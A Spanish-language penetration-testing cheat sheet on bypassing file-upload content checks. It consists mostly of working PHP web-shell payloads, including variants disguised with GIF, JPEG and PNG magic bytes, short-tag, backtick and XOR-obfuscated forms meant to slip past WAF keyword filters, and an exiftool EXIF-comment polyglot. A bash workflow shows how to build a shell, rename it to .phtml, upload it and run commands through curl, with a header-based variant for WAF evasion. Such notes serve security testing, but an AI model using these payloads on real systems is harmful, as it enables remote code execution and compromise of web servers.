---
aliases: null
tags:
  - vuln/file-upload
  - technique/execution
  - asset/web-app
kind: SubCheatSheet
linked:
  - '[[File Upload - Vulnerabilidades]]'
---
# File Upload - Bypass de Contenido (Magic Bytes + Ofuscación)

***

## Cheatsheet

| **Payload** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `GIF89a;<?php system($_GET['c']); ?>` | Magic bytes GIF + PHP payload | `file`/`mime_content_type` valida solo primeros bytes. |
| `\xFF\xD8\xFF\xE0<?php system($_GET['c']); ?>` | Magic bytes JPEG (JFIF) | Mismo, target JPEG. |
| `\x89PNG\r\n\x1a\n<?php ... ?>` | Magic bytes PNG | Mismo, target PNG. |
| `<?= system($_GET['c']); ?>` | Short open tag — bypassea filtro de `<?php` literal | `short_open_tag = On` en php.ini. |
| `<? system($_GET['c']); ?>` | Short tag plano (depende de versión) | Mismo. |
| `<script language="php">system($_GET['c']);</script>` | Sintaxis legacy PHP (pre-7) | PHP <7. |
| `<?= \`$_GET[0]\` ?>` | Backticks ejecutan shell (PHP backtick operator) | Sortea `system`/`exec` filtrados. |
| `$a='sys'.'tem'; $a($_GET['c']);` | Función concatenada — bypassea blacklist de keyword | WAF filtra `system` literal. |
| `$_GET['x']($_GET['c'])` (acceso `?x=system&c=id`) | Función dinámica desde GET param | WAF filtra cualquier función conocida. |
| `assert($_GET['c'])` | `assert()` ejecuta string como PHP | `system`/`exec` deshabilitados. |
| `exiftool -Comment='<?php system($_GET["cmd"]); ?>' real.jpg` | Payload en EXIF, archivo es JPEG válido | Whitelist + magic bytes strict. Chain con LFI. |
| `$_=('%01'^'`').('%13'^'`').('%13'^'`').('%05'^'`').('%12'^'`').('%14'^'`'); $_($_GET['c'])` | Genera `assert` via XOR de chars no-alfa | WAF bloquea TODO alfanumérico en archivo PHP. |
^fu-contenido

### Magic bytes por formato

| Formato | Bytes hex (primera línea) |
|:---:|:---:|
| GIF87a | `47 49 46 38 37 61` → `GIF87a` |
| GIF89a | `47 49 46 38 39 61` → `GIF89a` |
| JPEG/JFIF | `FF D8 FF E0` |
| JPEG/Exif | `FF D8 FF E1` |
| PNG | `89 50 4E 47 0D 0A 1A 0A` |
| PDF | `25 50 44 46` → `%PDF` |
| ZIP | `50 4B 03 04` → `PK..` |
| WAV/RIFF | `52 49 46 46` → `RIFF` |
| BMP | `42 4D` → `BM` |

### Workflow

```bash
# 1. PHP en JPEG-like (más simple)
printf 'GIF89a;\n<?php system($_GET["cmd"]); ?>' > shell.php
file shell.php  # → GIF image data
mime_type=$(mimetype shell.php 2>/dev/null || file -b --mime-type shell.php)
echo "$mime_type"  # → image/gif

# 2. PHP en EXIF de JPEG real (más sigilo)
cp legit.jpg poly.jpg
exiftool -Comment='<?php system($_GET["cmd"]); ?>' poly.jpg
# La imagen sigue siendo válida y abrible

# 3. Renombrar para que parser ejecute como PHP
mv poly.jpg poly.phtml  # ext alternativa para PHP

# 4. Subir + ejecutar
curl -F 'file=@poly.phtml' https://target/upload
curl 'https://target/uploads/poly.phtml?cmd=id'
```

### Ofuscación cuando WAF bloquea cmds salientes

WAF puede bloquear no solo la subida sino la **request al shell** (filtra `?cmd=cat`). Solución: payload PHP recibe comando en header HTTP custom:

```php
<?php system($_SERVER['HTTP_X_CMD']); ?>
```

```bash
curl 'https://target/uploads/shell.php' -H 'X-CMD: id'
```

___

## Overview

Bypass de contenido = sortear validaciones del **archivo en sí** (no solo extensión/MIME).

**Tres niveles de validación de contenido:**
1. **Magic bytes** — `file`/`mime_content_type` lee primeros bytes. Bypass: prefijar magic bytes válidos.
2. **`getimagesize()`** — verifica estructura interna JPEG/PNG. Bypass: payload en EXIF de imagen REAL.
3. **WAF de contenido** — busca `<?php`, `system`, `exec`. Bypass: short tags, ofuscación, funciones dinámicas.

Más estricto el filtro → más ofuscación necesitás. Tabla XOR/alphanumerical bypass es último recurso contra WAF agresivo.

***
